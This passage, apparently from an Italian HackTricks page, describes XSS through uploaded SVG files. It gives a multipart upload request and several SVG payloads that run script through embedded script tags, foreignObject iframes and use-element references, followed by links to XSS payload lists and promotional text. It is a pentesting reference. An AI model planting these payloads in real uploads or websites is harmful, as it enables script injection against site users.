Carica come immagine un file come il seguente (da [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Trova **altri payload SVG in** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Trucchi JS vari e informazioni pertinenti

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## Risorse XSS

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per bug bounty creata da hacker, per hacker! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare taglie fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
